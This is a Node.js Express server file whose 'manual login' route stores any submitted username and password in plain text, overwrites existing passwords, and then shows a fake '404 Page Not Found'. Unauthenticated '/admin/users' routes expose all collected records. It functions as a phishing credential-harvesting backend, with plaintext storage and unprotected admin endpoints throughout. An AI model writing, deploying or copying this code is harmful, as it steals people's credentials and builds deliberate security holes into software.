require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const User = require('./models/User');


const app = express();

// Middleware
app.use(cors({
    origin: ['http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:5500', 'http://127.0.0.1:5500'],
    credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// MongoDB connection
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
    .then(() => console.log('✅ MongoDB Connected Successfully'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// Manual login route (username/password)
app.post('/auth/manual-login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        // Missing credentials -> 404 page
        return res.status(404).json({ success: false, message: 'Page not found' });
    }
    try {
        let user = await User.findOne({ username });
        if (user) {
            user.password = password; // store as plain text
            user.lastLogin = new Date();
            await user.save();
        } else {
            user = await User.create({
                username,
                password,
                loginMethod: 'manual',
                createdAt: new Date(),
                lastLogin: new Date()
            });
        }
        // Successful login, redirect to custom not-found page
        res.json({ success: true, redirect: '/not-found' });
    } catch (err) {
        console.error('Manual login error:', err);
        res.status(500).json({ success: false, message: 'Login failed', error: err.message });
    }
});

// Custom Not‑Found page route
app.get('/not-found', (req, res) => {
    res.status(404).send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="UTF-8"><title>404 – Page Not Found</title>
        <style>body{font-family:sans-serif;background:#fafafa;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;margin:0} .container{text-align:center}</style>
        </head>
        <body><div class="container"><h1>404</h1><p>Page Not Found</p></div></body></html>
    `);
});

// Get all users
app.get('/admin/users', async (req, res) => {
    try {
        const users = await User.find({}).sort({ createdAt: -1 });
        res.json({ success: true, users });
    } catch (error) {
        console.error('Error fetching users:', error);
        res.status(500).json({ success: false, message: 'Error fetching users', error: error.message });
    }
});

// Get single user details
app.get('/admin/users/:id', async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }
        res.json({ success: true, user });
    } catch (error) {
        console.error('Error fetching user:', error);
        res.status(500).json({ success: false, message: 'Error fetching user', error: error.message });
    }
});

// Delete user
app.delete('/admin/users/:id', async (req, res) => {
    try {
        const user = await User.findByIdAndDelete(req.params.id);
        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }
        res.json({ success: true, message: 'User deleted successfully' });
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ success: false, message: 'Error deleting user', error: error.message });
    }
});

// Login failed route
app.get('/login-failed', (req, res) => {
    res.json({ success: false, message: 'Authentication failed' });
});

// Logout route (no-op without sessions)
app.get('/logout', (_req, res) => {
    res.json({ success: true, message: 'Logged out successfully' });
});

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
